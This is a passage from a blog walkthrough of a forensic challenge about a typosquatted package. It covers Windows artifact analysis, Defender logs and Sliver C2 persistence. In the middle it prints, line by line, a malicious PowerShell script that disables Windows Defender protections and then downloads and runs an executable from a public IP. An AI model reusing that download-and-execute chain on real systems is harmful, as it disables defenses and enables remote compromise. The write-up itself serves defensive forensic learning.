</code></pre></div></div> <p>(There are probably more efficient ways to search for files modified at a certain timestamp, but this is what I came up with on the fly. Let me know if you know a better way!)</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/11.png" sizes="95vw"/> <img src="/assets/img/nuts/11.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 11 </div> <p>Its worth noting here that my system is not displaying the UTC times as the file’s timestamps. It is showing a time 4 hours behind UTC, so while the timestamp on my machine is <code class="language-plaintext highlighter-rouge">2024-03-19 14:41</code>, the answer in UTC is <code class="language-plaintext highlighter-rouge">2024-03-19 18:41</code>.</p> <h2 id="task-5-despite-restrictions-the-attacker-successfully-uploaded-the-malicious-file-to-the-official-site-by-altering-one-key-detail-what-is-the-modified-package-id-of-the-malicious-package">Task 5: Despite restrictions, the attacker successfully uploaded the malicious file to the official site by altering one key detail. What is the modified package ID of the malicious package?</h2> <p>This one should be easy. The answer has been all over all the past tasks.</p> <h2 id="task-6-which-deceptive-technique-did-the-attacker-employ-during-the-initial-access-phase-to-manipulate-user-perception-technique-name">Task 6: Which deceptive technique did the attacker employ during the initial access phase to manipulate user perception? (technique name)</h2> <p>I’ve mentioned it already in this post: <strong>Typosquatting</strong>. Here is a <a href="https://en.wikipedia.org/wiki/Typosquatting">link</a> to the Wikipedia article if you’re curious.</p> <h2 id="task-7-determine-the-full-path-of-the-file-within-the-package-containing-the-malicious-code">Task 7: Determine the full path of the file within the package containing the malicious code.</h2> <p>What files do we have to choose from?</p> <div class="row mt-3"> <div class="col-sm-8 mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/12.png" sizes="95vw"/> <img src="/assets/img/nuts/12.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 12 </div> <p>Of the files in the package directory, the powershell script looks the most interesting at first glance. Checking its contents confirms that it is malicious.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/13.png" sizes="95vw"/> <img src="/assets/img/nuts/13.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 13 </div> <p>Breaking this script down a little to show how it’s malicious:</p> <ol> <li>It disables two aspects of Windows Defender. <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w"> </span><span class="n">Set-MpPreference</span><span class="w"> </span><span class="nt">-DisableRealtimeMonitoring</span><span class="w"> </span><span class="bp">$true</span><span class="w">
 </span><span class="n">Set-MpPreference</span><span class="w"> </span><span class="nt">-DisableScanningMappedNetworkDrivesForFullScan</span><span class="w"> </span><span class="bp">$true</span><span class="w">
</span></code></pre></div> </div> <p>Disabling realtime monitoring, means that Windows Defender won’t scan files as they download or executables as they run, enabling an attacker to download and run malicious files. Disabling scanning mapped network drives means that network drives won’t be scanned during full system scans, giving attackers a potential hiding place for malicious files.</p> </li> <li>It sets up variables for the installation path, building it if it does not exist. <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w"> </span><span class="nv">$Path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">ProgramData</span><span class="s2">\Microsoft Visual Studio"</span><span class="w">
 </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="o">-not</span><span class="w"> </span><span class="p">(</span><span class="n">Test-Path</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$Path</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span><span class="n">New-Item</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$Path</span><span class="w"> </span><span class="nt">-ItemType</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
 </span><span class="p">}</span><span class="w">
</span></code></pre></div> </div> </li> <li>It sets a variable for the malware name. <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w"> </span><span class="nv">$ProcName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"uninstall.exe"</span><span class="w">
</span></code></pre></div> </div> <p>And the download URL.</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w"> </span><span class="nv">$WebFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"http://54.93.81.220:8000/</span><span class="nv">$ProcName</span><span class="s2">"</span><span class="w">
</span></code></pre></div> </div> </li> <li>Combining the variables, the script downloads the malware, placing it at the installation path. <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w"> </span><span class="n">Invoke-WebRequest</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$WebFile</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="s2">"</span><span class="nv">$Path</span><span class="s2">\</span><span class="nv">$ProcName</span><span class="s2">"</span><span class="w">
</span></code></pre></div> </div> </li> <li>Finally, it executes the malware that it just downloaded, probably initiating a beaconing process. <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w"> </span><span class="n">Start-Process</span><span class="w"> </span><span class="nt">-FilePath</span><span class="w"> </span><span class="s2">"</span><span class="nv">$Path</span><span class="s2">\</span><span class="nv">$ProcName</span><span class="s2">"</span><span class="w">
</span></code></pre></div> </div> </li> </ol> <p>This all appears quite malicious because it is downloading and executing an arbitrary file from an arbitrary public IP. Bad.</p> <p>I checked the IP address on VirusTotal. While it’s not connected with other malicious incidents, it still looks malicious. It is a public IP owned by Amazon, meaning that it could easily be an AWS instance operated by anyone, including threat actors.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/14.png" sizes="95vw"/> <img src="/assets/img/nuts/14.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 14 </div> <h2 id="task-8-when-tampering-with-the-systems-security-settings-what-command-did-the-attacker-employ">Task 8: When tampering with the system’s security settings, what command did the attacker employ?</h2> <p>I went over two security settings that were tampered with in the script from the previous task. One of those is the answer the this question.</p> <h2 id="task9">Task 9: Following the security settings alteration, the attacker downloaded a malicious file to ensure continued access to the system. Provide the SHA1 hash of this file.</h2> <p>I had a heck of a time finding this hash. I shouldn’t have, but I did. Let me explain. In doing so, I’ll go over some of the techniques I used that failed in this case. Beginners may find them educational, and I’ll feel less like I wasted my time doing them in the first place.</p> <p>If you just want the to know where I found the hash, skip to <a href="#hash-location">here</a>.</p> <p>The question is asking for the SHA1 hash of <code class="language-plaintext highlighter-rouge">uninstall.exe</code>, the file downloaded by the malicious script. The first thing I did was see if I could find a copy of the file to hash.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/15.png" sizes="95vw"/> <img src="/assets/img/nuts/15.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 15 </div> <p>No luck, it looks like that file did exist at some point and ran on the system. If it ran on the system and Sysmon was installed and configured, it could have captured the files hash in a few different logs: <em>Sysmon Event ID 15 FileCreateStreamHash</em> when it was downloaded and <em>Sysmon Event ID 1 ProcessCreate</em>.</p> <p>There are some logs available at <code class="language-plaintext highlighter-rouge">C/Windows/System32/winevt/Logs/</code>, but no sysmon logs.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/16.png" sizes="95vw"/> <img src="/assets/img/nuts/16.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 16 </div> <p>I went on a little Sysmon goose-chase. Are there any files related to Sysmon anywhere?</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/17.png" sizes="95vw"/> <img src="/assets/img/nuts/17.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 17 </div> <p>There are some prefetch files, so sysmon has run on this system, but it’s gone now. That’s interesting because it means that the attacker may have tampered with sysmon and/or removed the sysmon log from the system. But I digress. Either way the hash is not available via Sysmon, but maybe some other log caught something about <code class="language-plaintext highlighter-rouge">uninstall.exe</code> and recorded it’s hash. I used <a href="https://github.com/WithSecureLabs/chainsaw">Chainsaw</a> to query all the logs that existed in the logs directory and search for “uninstall” like this, resulting in 2 matches.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chainsaw search <span class="nt">--timestamp</span> <span class="s1">'Event.System.TimeCreated_attributes.SystemTime'</span> <span class="nt">--from</span> <span class="s2">"2020-06-27T14:03:25"</span> <span class="nt">--skip-errors</span> <span class="s2">"uninstall"</span> C/Windows/System32/winevt/logs
</code></pre></div></div> <p>Both were related to an execution of the malicious <code class="language-plaintext highlighter-rouge">uninstall.exe</code> and they contained some interesting information, but no hash.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/18.png" sizes="95vw"/> <img src="/assets/img/nuts/18.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 18 </div> <p>For example, we can see that despite the attackers’ efforts to disable Windows Defender, it ended up identifying and quarantining the malicious <code class="language-plaintext highlighter-rouge">uninstall.exe</code>.</p> <p>Next, I wondered if there were other logs, outside of the ones stored in <code class="language-plaintext highlighter-rouge">C/Windows/System32/winevt/logs</code> that might have recorded its hash, so I searched every file with grep.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/19.png" sizes="95vw"/> <img src="/assets/img/nuts/19.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 19 </div> <p>The results show:</p> <ol> <li>Two instances of the malicious powershell script. That makes sense.</li> <li>Something related to Cortana which didn’t end up being related to our malicious <code class="language-plaintext highlighter-rouge">uninstall.exe</code>.</li> <li><code class="language-plaintext highlighter-rouge">$MFT</code>, the Master File Table. I thought this one might be interesting.</li> </ol> <p><strong>This is where I should have found the hash:</strong> <em>There is in fact a log file on the system containing “uninstall.exe” in plaintext next to the hash of the file, but it didn’t come up in this search, so I moved on to the MFT. At the end of this section, I’ll explain which file I missed and why it wasn’t returned in this search. For now, back to my ill-fated search.</em></p> <p>The MFT holds metadata about all the files on the file system. If files are small enough, with contents less than ~512 bytes, they can be stored directly in the MFT. These are known as resident files. When they are deleted from the file system, their MFT record will persist until it is overwritten, meaning that it might be possible to recover <code class="language-plaintext highlighter-rouge">uninstall.exe</code>. It’s probably unlikely that its small enough to be a resident file, but its worth a glance.</p> <p>Also relevant and useful when thinking about the files on the system is the USN Journal, which stores a record of all the events that happen to each file.</p> <p>MFT is located at <code class="language-plaintext highlighter-rouge">C/$MFT</code> and the USN Journal is located at <code class="language-plaintext highlighter-rouge">C/$Extend/$J</code>.</p> <p><strong>Note:</strong> I analyzed these using Eric Zimmerman’s (EZ) <em>EZ-Tools</em> suite. If you don’t have them, I’d recommend just using his script provided in the <em>Get-ZimmermanTools.zip</em> that is available on his <a href="https://ericzimmerman.github.io/#!index.m">github pages site</a>. I use EZ-Tools on a Windows machine, but you could probably set them up on linux with Wine or maybe just a .NET installation. I haven’t tried.</p> <p>Unfortunately, the MFT didn’t contain a record for <code class="language-plaintext highlighter-rouge">uninstall.exe</code>, so there was no chance of recovery from there (Fig. 20)</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/20.png" sizes="95vw"/> <img src="/assets/img/nuts/20.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 20 </div> <p>The USN Journal shows that <code class="language-plaintext highlighter-rouge">uninstall.exe</code> was deleted at 19:34:00, the exact time that the Windows Defender log shows that it was quarantined (Fig. 21)</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/21.png" sizes="95vw"/> <img src="/assets/img/nuts/21.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 21 </div> <p>While I was there, I checked on the Sysmon log to satisfy my curiosity, and yes, it is in the MFT! (Fig. 22)</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/22.png" sizes="95vw"/> <img src="/assets/img/nuts/22.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 22 </div> <p>The USN Journal shows that Sysmon logs were… Not deleted (fig. 23)? Wait. They don’t exist on the file system image, but MFT and USN Journal have a record of their existence but not their deletion?</p> <div class="row mt-3" style="margin-bottom: 0px;"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/23.png" sizes="95vw"/> <img src="/assets/img/nuts/23.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 23 </div> <p>MFTExplorer clearly shows that the “Is Deleted” box is <em>not</em> checked next to the Sysmon log (Fig. 24).</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/24.png" sizes="95vw"/> <img src="/assets/img/nuts/24.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 24 </div> <p>I don’t know how this would happen unless <em>a)</em> the forensic image itself were tampered with after it was taken from the target machine or <em>b)</em> the image didn’t include Sysmon logs in the first place. For the purposes of the Sherlock, I assume the authors just wanted to remove it to add some extra challenge, but in real life this might imply a more serious situation. If anyone reading this knows how an attacker could delete Sysmon logs without recording that in the USN Journal or the MFT, let me know! If I’m wrong, I’d love to find out.</p> <p>This is where I lost my last bit of hope that I might find the hash in a hidden or recovered Sysmon log, given that I now assumed the Authors removed it on purpose.</p> <p>Back to the search for <code class="language-plaintext highlighter-rouge">uninstall.exe</code>’s hash. I began to wonder if I could use other files’ hashes to identify the malware family on VirusTotal, and then use that information to pivot to the hash of <code class="language-plaintext highlighter-rouge">uninstall.exe</code> on VirusTotal or other sites. I tried the <code class="language-plaintext highlighter-rouge">init.ps1</code> and the other package files, but no hits on VT. To see what happened leading up to the deletion, I sorted USN Journal by time and scrolled back in time, eventually seeing this (Fig. 25).</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/25.png" sizes="95vw"/> <img src="/assets/img/nuts/25.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 25 </div> <p>I was able to locate this file at <code class="language-plaintext highlighter-rouge">C/ProgramData/updater.exe</code> in the forensic image using the <code class="language-plaintext highlighter-rouge">find</code> command. I hashed it as shown in Fig. 26 and checked the hash on VT. It came back as being detected by many AV products (Fig. 27)</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/26.png" sizes="95vw"/> <img src="/assets/img/nuts/26.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 26 </div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/27.png" sizes="95vw"/> <img src="/assets/img/nuts/27.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 27 </div> <p>I found out that the <code class="language-plaintext highlighter-rouge">updater.exe</code> is associated with an infostealer known as <em>impalastealer</em> and I found several associated files on <a href="https://www.joesandbox.com/analysis/search?q=impalastealer">JoeSandbox</a> (Fig. 28).</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/28.png" sizes="95vw"/> <img src="/assets/img/nuts/28.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 28 </div> <p>Alas, none of them turned out to have the same hash as <code class="language-plaintext highlighter-rouge">uninstaller.exe</code>. At this point I concluded that I was probably slightly out of bounds for the intended method of finding the hash so I combed back through my evidence to see where I might have gone wrong.</p> <h3 id="hash-location">The conclusion of my quest for the SHA1 hash</h3> <p>I ended up focusing back on the fact that Windows Defender had quarantined the file. I thought that if it quarantines a file, it must store a record of that file’s hash somewhere, right? The question became “What other log sources are there for Windows Defender?” I used the following query to try and find out:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find <span class="nb">.</span> <span class="nt">-ipath</span> <span class="s2">"*defender*"</span> | <span class="nb">grep </span>log
</code></pre></div></div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/29.png" sizes="95vw"/> <img src="/assets/img/nuts/29.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 29 </div> <p>Ah, so there were some other logs, but I couldn’t seem to grep for actual words within these logs (Fig. 30), though sometimes I’d get binary matches.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/30.png" sizes="95vw"/> <img src="/assets/img/nuts/30.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 30 </div> <p>This felt like strange behavior, so I checked the files’ types (Fig. 31). The result explained why I couldn’t grep these files normally and why I didn’t find the hash much much earlier. These logs are encoded in UTF-16, which is not compatible with standard grep.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/31.png" sizes="95vw"/> <img src="/assets/img/nuts/31.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 31 </div> <p>I could open these logs in a text editor and search them manually or with ctrl + f, or I can use the following technique to convert them to UTF-8 and then pipe the result to grep, finally resulting in the hash (Fig. 32):</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iconv <span class="nt">-f</span> UTF-16LE <span class="nt">-t</span> UTF-8 C/ProgramData/Microsoft/Windows<span class="se">\ </span>Defender/Support/<span class="k">*</span> | <span class="nb">grep</span> <span class="nt">-i</span> uninstall 
</code></pre></div></div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/32.png" sizes="95vw"/> <img src="/assets/img/nuts/32.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 32 </div> <p>This result came from the file <code class="language-plaintext highlighter-rouge">C/ProgramData/Microsoft/Windows Defender/Support/MPLog-20231206-044317.log</code></p> <h2 id="task-10-identify-the-framework-utilised-by-the-malicious-file-for-command-and-control-communication">Task 10: Identify the framework utilised by the malicious file for command and control communication.</h2> <p>Opening up the log file the hash was in to take a closer look, I found the reason for quarantine (Fig. 33) under “Threat Name:” by looking near instances of the name of the malicious file.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/33.png" sizes="95vw"/> <img src="/assets/img/nuts/33.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 33 </div> <p><em>Sliver</em> is a C2 framework (Fig. 34)</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/34.png" sizes="95vw"/> <img src="/assets/img/nuts/34.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 34 </div> <p><strong>Bonus:</strong> If you notice that some of the other files in <code class="language-plaintext highlighter-rouge">C/ProgramData/Microsoft/Windows Defender/Support/</code> are modified within the timeframe of the attack (Fig. 35), then take a look at their contents with <code class="language-plaintext highlighter-rouge">strings</code>, you’ll find <em>Sliver</em> mentioned again (Fig. 36)</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/35.png" sizes="95vw"/> <img src="/assets/img/nuts/35.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 35 </div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/36.png" sizes="95vw"/> <img src="/assets/img/nuts/36.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 36: Here you can also see a reference to Hive, a notorious ransomware group. </div> <h2 id="task-11-at-what-precise-moment-was-the-malicious-file-executed">Task 11: At what precise moment was the malicious file executed?</h2> <p>Remember that the script downloads and executes the malicious <code class="language-plaintext highlighter-rouge">uninstall.exe</code> in quick succession, meaning these things should happen at the same timestamp (Fig. 37). I used the USN Journal to reference <code class="language-plaintext highlighter-rouge">uninstall.exe</code>’s creation time (See <a href="#task9">Task 9</a> for details on USN Journal).</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/37.png" sizes="95vw"/> <img src="/assets/img/nuts/37.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 37 </div> <h2 id="task-12-the-attacker-made-a-mistake-and-didnt-stop-all-the-features-of-the-security-measures-on-the-machine-when-was-the-malicious-file-detected-provide-the-timestamp-in-utc">Task 12: The attacker made a mistake and didn’t stop all the features of the security measures on the machine. When was the malicious file detected? Provide the timestamp in UTC.</h2> <p>Ah, yes. I already found out about this. An examination of the related Windows Defender log provides the answer (Fig. 38)</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/38.png" sizes="95vw"/> <img src="/assets/img/nuts/38.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 38 </div> <h2 id="task-13-after-establishing-a-connection-with-the-c2-server-what-was-the-first-action-taken-by-the-attacker-to-enumerate-the-environment-provide-the-name-of-the-process">Task 13: After establishing a connection with the C2 server, what was the first action taken by the attacker to enumerate the environment? Provide the name of the process.</h2> <p>I had loaded the forensic image into <a href="https://www.autopsy.com/">Autopsy</a> earlier, so here I looked under the <em>Run Programs</em> tab to see what had been run just after <code class="language-plaintext highlighter-rouge">uninstall.exe</code> (Fig. 39). The first command that could be considered enumeration is <code class="language-plaintext highlighter-rouge">whoami.exe</code>.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/39.png" sizes="95vw"/> <img src="/assets/img/nuts/39.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 39 </div> <h2 id="task-14-to-ensure-continued-access-to-the-compromised-machine-the-attacker-created-a-scheduled-task-what-is-the-name-of-the-created-task">Task 14: To ensure continued access to the compromised machine, the attacker created a scheduled task. What is the name of the created task?</h2> <p>I just listed the contents of <code class="language-plaintext highlighter-rouge">C/Windows/System32/Tasks</code> with the <code class="language-plaintext highlighter-rouge">--full-time</code> option and looked for a task within the timeframe of the attack (Fig. 40). There was only one that made sense.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0 small-margin"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/nuts/40.png" sizes="95vw"/> <img src="/assets/img/nuts/40.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption" style="margin-top: 5px;"> Fig. 40 </div> <h2 id="task-15-when-was-the-scheduled-task-created-provide-the-timestamp-in-utc">Task 15: When was the scheduled task created? Provide the timestamp in UTC.</h2> <p>This is the same timestamp we checked in the previous task. Remember that your system might not show the correct timezone, so convert to UTC (+4 hours for me) to get <code class="language-plaintext highlighter-rouge">2024-03-19 19:24:05</code>.</p> <h2 id="task-16-upon-concluding-the-intrusion-the-attacker-left-behind-a-specific-file-on-the-compromised-host-what-is-the-name-of-this-file">Task 16: Upon concluding the intrusion, the attacker left behind a specific file on the compromised host. What is the name of this file?</h2> <p>I already found this file while searching for the <code class="language-plaintext highlighter-rouge">uninstall.exe</code> hash in <a href="#task9">Task 9</a>. It was originally named <code class="language-plaintext highlighter-rouge">file.txt</code></p> <h2 id="task-17-as-an-anti-forensics-measure-the-threat-actor-changed-the-file-name-after-executing-it-what-is-the-new-file-name">Task 17: As an anti-forensics measure. The threat actor changed the file name after executing it. What is the new file name?</h2> <p>Again, see <a href="#task9">Task 9</a> for details. It was renamed to <code class="language-plaintext highlighter-rouge">updater.exe</code> and it is located at <code class="language-plaintext highlighter-rouge">C/ProgramData/updater.exe</code>.</p> <h2 id="task-18-identify-the-malware-family-associated-with-the-file-mentioned-in-the-previous-question-17">Task 18: Identify the malware family associated with the file mentioned in the previous question (17).</h2> <p>I hashed the file and searched it on VT (Fig. 41). Its family labels on VT are not the answer to this question (though the answer does exist somewhere in one of its VT 